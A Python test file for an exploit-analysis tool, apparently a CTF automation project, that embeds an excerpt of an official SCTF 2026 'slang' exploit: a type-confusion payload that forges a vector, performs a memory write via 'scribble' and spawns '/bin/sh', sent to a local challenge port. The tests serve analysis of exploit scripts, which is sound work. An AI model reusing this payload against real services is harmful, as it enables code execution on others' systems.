import json
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
AUTOCORRECT = ROOT / "autocorrect"
PROJECT = ROOT / "pwncraft"
for path in (AUTOCORRECT, PROJECT):
    if str(path) not in sys.path:
        sys.path.insert(0, str(path))

from challenge_intake import load_splits, split_for_case
from pwncraft.features.audit.semantic_facts import analyze_exp_semantics

CASE_ID = "memory_write-sctf-2026-slang-a31e8aa0"
TRUTH = ROOT / "autocorrect" / "cases" / CASE_ID / "expected_truth.json"

# Source-derived excerpt from the official SCTF 2026 slang exp.py.  The embedded
# language is intentionally treated as payload bytes in this cycle, not parsed
# as Python or guessed as a memory-write primitive.
OFFICIAL_EXP_SHAPE = r'''PAYLOAD = r''' + "'''" + r'''function one() : -> int {
  return 1;
}

function forge() : -> str {
  return "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x7f";
}

function pwn(int round, vec forged_vec) : -> void {
  if (round == 0) {
    return;
  };
  say("resolve puts");
  scribble(forged_vec, 526339, -205200);
  say("/bin/sh");
  return;
}
''' + "'''" + r'''

def main():
    source = PAYLOAD + "END_OF_SOURCE\n"
    with socket.create_connection(("127.0.0.1", 9999), timeout=5) as sock:
        sock.sendall(source.encode())
'''


def test_sctf2026_slang_is_registered_as_train() -> None:
    assert split_for_case(CASE_ID, load_splits()) == "train"


def test_truth_is_locked_to_official_syclover_materials() -> None:
    truth = json.loads(TRUTH.read_text(encoding="utf-8"))
    assert truth["source_class"] == "official_challenge_archive"
    assert truth["event"]["name"] == "SCTF 2026"
    assert truth["event"]["challenge"] == "slang"
    assert truth["materials"]["exp_wrapper_git_blob_sha1"] == \
        "a31e8aa066aab023f58750923652f3f40fbbb874"
    assert truth["materials"]["official_writeup_git_blob_sha1"] == \
        "f6d4a55258e8cd64fe31565eb3ce8fa7de7b1ab9"


def test_official_wrapper_recovers_exact_embedded_source_transport() -> None:
    result = analyze_exp_semantics(OFFICIAL_EXP_SHAPE)
    assert result["status"] == "ok"
    payloads = result["outbound_literal_payloads"]
    assert len(payloads) == 1
    payload = payloads[0]
    raw = payload["content"]
    assert isinstance(raw, bytes)
    assert b"scribble(forged_vec, 526339, -205200);" in raw
    assert raw.endswith(b"END_OF_SOURCE\n")
    assert payload["expression"] == "source.encode()"
    assert payload["provenance"] == "EXP_AST_LITERAL_DATAFLOW"


def test_transport_evidence_does_not_auto_promote_official_writeup_primitive() -> None:
    result = analyze_exp_semantics(OFFICIAL_EXP_SHAPE)
    assert result["primitives"] == []
    truth = json.loads(TRUTH.read_text(encoding="utf-8"))
    write_layer = truth["truth_layers"]["TYPE_CONFUSION_AND_WRITE_CHAIN"]
    assert write_layer["status"] == "PROVEN_OFFICIAL_WRITEUP"
    assert "automatic Slang AST/semantic parsing is not implemented in this cycle" in truth["unknown"]
